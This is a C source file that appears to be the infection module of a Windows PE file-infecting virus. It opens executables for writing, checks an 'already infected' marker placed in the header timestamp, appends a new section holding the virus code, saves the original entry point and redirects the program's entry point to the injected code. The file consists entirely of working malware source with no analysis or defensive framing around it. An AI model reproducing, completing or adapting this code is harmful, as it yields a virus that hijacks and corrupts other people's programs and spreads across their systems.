#include "infect.h"
#include "oep.h"
#include "pe.h"
#include "utility.h"

typedef struct {
    HANDLE h_file;
    HANDLE h_map;
    void *start_address;
    DWORD size;
} file_view_t;

static int can_infect(const char *filename, data_t *data);
static void modify_headers(IMAGE_NT_HEADERS *nt_headers, uint32_t code_size);
static void *copy_code(IMAGE_NT_HEADERS *nt_headers, file_view_t *file_view,
                       data_t *data);
static void modify_entrypoint(IMAGE_NT_HEADERS *nt_headers, uint32_t entry_offset,
                              void *target_code_begin);
static uint32_t get_extended_file_size(const char *filename, data_t *data);
static int open_file_view(const char *filename, file_view_t *file_view,
                          data_t *data);
static void close_file_view(file_view_t *file_view, data_t *data);

int infect(const char *filename, data_t *data) {
    int ret = 0;
    if (can_infect(filename, data)) {
        file_view_t file_view;
        memzero(&file_view, sizeof(file_view_t));

        uint32_t extended_size = get_extended_file_size(filename, data);
        file_view.size = extended_size;
        if (open_file_view(filename, &file_view, data) == 0) {
            IMAGE_NT_HEADERS *nt_headers = get_nt_header(file_view.start_address);
            modify_headers(nt_headers, data->code_size);
            void *target_code_begin = copy_code(nt_headers, &file_view, data);
            modify_entrypoint(nt_headers, data->entry_offset, target_code_begin);

            data->function_list.flushViewOfFile(file_view.start_address,
                                            extended_size);

            close_file_view(&file_view, data);
        } else {
            ret = 1;
        }
    } else {
        ret = 2;
    }
    return ret;
}

static void modify_headers(IMAGE_NT_HEADERS *nt_headers, uint32_t code_size) {
    create_section_header(get_last_section_header(nt_headers) + 1, nt_headers,
                          code_size);
    IMAGE_SECTION_HEADER *new_sector = get_last_section_header(nt_headers);

    nt_headers->FileHeader.TimeDateStamp = INFECTION_MARKER;
    // original sizes are already aligned, so add only aligned increase (and not
    // align(orig + inc))
    // nt_headers->OptionalHeader.SizeOfCode += align_value(code_size,
    // nt_headers->OptionalHeader.FileAlignment);
    nt_headers->OptionalHeader.SizeOfCode +=
        align_value(code_size, nt_headers->OptionalHeader.FileAlignment);
    if (nt_headers->OptionalHeader.SizeOfCode <
        new_sector->PointerToRawData + new_sector->SizeOfRawData -
            nt_headers->OptionalHeader.BaseOfCode) {
        nt_headers->OptionalHeader.SizeOfCode =
            align_value(new_sector->PointerToRawData + new_sector->SizeOfRawData -
                            nt_headers->OptionalHeader.BaseOfCode,
                        nt_headers->OptionalHeader.FileAlignment);
    }
    nt_headers->OptionalHeader.SizeOfImage +=
        align_value(code_size + sizeof(IMAGE_SECTION_HEADER),
                    nt_headers->OptionalHeader.SectionAlignment);
    nt_headers->OptionalHeader.SizeOfHeaders += align_value(
        sizeof(IMAGE_SECTION_HEADER), nt_headers->OptionalHeader.FileAlignment);
}

static void *copy_code(IMAGE_NT_HEADERS *nt_headers, file_view_t *file_view,
                       data_t *data) {
    IMAGE_SECTION_HEADER *section_header = get_last_section_header(nt_headers);
    void *target_code_begin =
        (uint8_t *)file_view->start_address + section_header->PointerToRawData;
    memcp(data->code_begin_addr, target_code_begin, data->code_size);
    return target_code_begin;
}

// virus code must already been copied to target file!
static void modify_entrypoint(IMAGE_NT_HEADERS *nt_headers, uint32_t entry_offset,
                              void *target_code_begin) {
    uint32_t oep = nt_headers->OptionalHeader.ImageBase +
                   nt_headers->OptionalHeader.AddressOfEntryPoint;
    if (write_original_entry_point(oep, target_code_begin) != 0) {
        PRINT_DEBUG("could not save original entry point\n");
    }

    IMAGE_SECTION_HEADER *section_header = get_last_section_header(nt_headers);
    nt_headers->OptionalHeader.AddressOfEntryPoint =
        section_header->VirtualAddress + entry_offset;
}

static int can_infect(const char *filename, data_t *data) {
    file_view_t fw;
    memzero(&fw, sizeof(file_view_t));

    if (open_file_view(filename, &fw, data) != 0) {
        PRINT_DEBUG("can't infect \"%s\": could not open file\n", filename);
        return 0;
    }

    if (!is_pe(fw.start_address)) {
        PRINT_DEBUG("can't infect \"%s\": no valid pe\n", filename);
        close_file_view(&fw, data);
        return 0;
    }

    IMAGE_NT_HEADERS *nt_headers = get_nt_header(fw.start_address);
    IMAGE_SECTION_HEADER *section_header =
        get_section_header(nt_headers, nt_headers->FileHeader.NumberOfSections);

    if (!is_section_header_empty(section_header)) {
        PRINT_DEBUG("can't infect \"%s\": no additional empty section header\n",
                    filename);
        close_file_view(&fw, data);
        return 0;
    }
    if (nt_headers->FileHeader.TimeDateStamp == INFECTION_MARKER) {
        PRINT_DEBUG("can't infect \"%s\": already infected\n", filename);
        close_file_view(&fw, data);
        return 0;
    }
    return 1;
}

static uint32_t get_extended_file_size(const char *filename, data_t *data) {
    file_view_t fw;
    memzero(&fw, sizeof(file_view_t));

    if (open_file_view(filename, &fw, data) != 0) {
        PRINT_DEBUG("could not open view of file\n");
        return 0;
    }
    IMAGE_NT_HEADERS *nt_headers = get_nt_header(fw.start_address);
    uint32_t extended_size =
        fw.size + nt_headers->OptionalHeader.FileAlignment +
        align_value(data->code_size, nt_headers->OptionalHeader.FileAlignment);
    close_file_view(&fw, data);
    return extended_size;
}

static int open_file_view(const char *filename, file_view_t *file_view,
                          data_t *data) {
    file_view->h_file =
        data->function_list.create_file_a(filename, GENERIC_READ | GENERIC_WRITE,
                                    FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                                    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (file_view->h_file == INVALID_HANDLE_VALUE) {
        return 1;
    }
    if (file_view->size == 0) {
        file_view->size =
            (DWORD)data->function_list.get_file_size(file_view->h_file, NULL);
        if (file_view->size == INVALID_FILE_SIZE) {
            data->function_list.close_handle(file_view->h_file);
            return 2;
        }
    }

    file_view->h_map = data->function_list.create_file_mapping_a(
        file_view->h_file, NULL, PAGE_READWRITE, 0, file_view->size, NULL);

    if (file_view->h_map == NULL) {
        data->function_list.close_handle(file_view->h_file);
        return 3;
    }

    file_view->start_address = (void *)data->function_list.map_view_of_file(
        file_view->h_map, FILE_MAP_ALL_ACCESS, 0, 0, file_view->size);

    if (file_view->start_address == NULL) {
        data->function_list.close_handle(file_view->h_map);
        data->function_list.close_handle(file_view->h_file);
        return 4;
    }
    return 0;
}

static void close_file_view(file_view_t *file_view, data_t *data) {
    data->function_list.unmap_view_of_file((LPCVOID)file_view->start_address);
    data->function_list.close_handle(file_view->h_map);
    data->function_list.close_handle(file_view->h_file);
    memzero(file_view, sizeof(file_view_t));
}
